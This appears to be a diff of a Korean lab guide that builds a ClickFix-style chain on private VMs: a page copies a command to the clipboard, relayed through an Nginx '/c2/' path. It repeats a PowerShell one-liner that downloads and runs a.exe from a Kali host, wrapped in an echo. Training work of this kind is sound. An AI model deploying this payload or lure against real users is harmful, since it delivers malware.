@@ -22,7 +22,7 @@ Windows Victim
 192.168.50.101
         | 버튼 클릭
         v
-허용된 Hello World 명령이 클립보드에 복사됨
+허용된 PowerShell 데모 명령이 클립보드에 복사됨
 ```
 
 | VM | 역할 | IP 주소 |
@@ -221,7 +221,7 @@ nano ~/Desktop/test.txt
 다음 한 줄을 정확히 입력합니다.
 
 ```bat
-powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'[해시값]'){&$p}else{ri $p -Force}"
+cmd /k echo powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash -eq '8d85636b97a74705cbc1e5ba8c46389a4a8dc4846f0a12d7edf19b9695e8be94'){&$p}else{ri $p -Force}"
 ```
 
 `Ctrl+O`, `Enter`, `Ctrl+X` 순서로 눌러 저장하고 편집기를 종료합니다.
@@ -251,7 +251,7 @@ curl http://192.168.50.10:8000/test.txt
 다음 문자열이 출력되면 정상입니다.
 
 ```bat
-cmd /k echo powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'8d85636b97a74705cbc1e5ba8c46389a4a8dc4846f0a12d7edf19b9695e8be94'){&$p}else{ri $p -Force}"
+cmd /k echo powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash -eq '8d85636b97a74705cbc1e5ba8c46389a4a8dc4846f0a12d7edf19b9695e8be94'){&$p}else{ri $p -Force}"
 ```
 
 ## 8. Ubuntu Nginx 중계 설정
@@ -329,7 +329,7 @@ curl http://192.168.50.30/c2/lab-command.txt
 다음 문자열이 출력되면 중계에 성공한 것입니다.
 
 ```bat
-cmd /k echo powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'[해시값]'){&$p}else{ri $p -Force}"
+cmd /k echo powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash -eq '8d85636b97a74705cbc1e5ba8c46389a4a8dc4846f0a12d7edf19b9695e8be94'){&$p}else{ri $p -Force}"
 ```
 
 요청 흐름은 다음과 같습니다.
@@ -360,7 +360,7 @@ http://192.168.50.30
 다음 내용이 붙여넣어지면 최종 성공입니다.
 
 ```bat
-cmd /k echo powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'[해시값]'){&$p}else{ri $p -Force}"
+cmd /k echo powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash -eq '8d85636b97a74705cbc1e5ba8c46389a4a8dc4846f0a12d7edf19b9695e8be94'){&$p}else{ri $p -Force}"
 ```
 
 웹페이지는 이 명령을 실행하지 않고 클립보드에만 복사합니다.
@@ -411,7 +411,7 @@ ip -4 addr
 
 - Kali HTTP 서버가 실행 중인지 확인합니다.
 - Ubuntu에서 `curl http://192.168.50.10:8000/test.txt`가 성공하는지 확인합니다.
-- `test.txt`가 `cmd /k echo "powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'[해시값]'){&$p}else{ri $p -Force}"`와 정확히 일치하는지 확인합니다.
+- `test.txt`가 `cmd /k echo powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash -eq '8d85636b97a74705cbc1e5ba8c46389a4a8dc4846f0a12d7edf19b9695e8be94'){&$p}else{ri $p -Force}"`와 정확히 일치하는지 확인합니다.
 - Nginx 경로가 `/c2/lab-command.txt`인지 확인합니다.
 - `Ctrl+Shift+R`을 눌러 브라우저 캐시를 새로고침합니다.
 - 브라우저 개발자 도구의 Network 및 Console 탭에서 오류를 확인합니다.
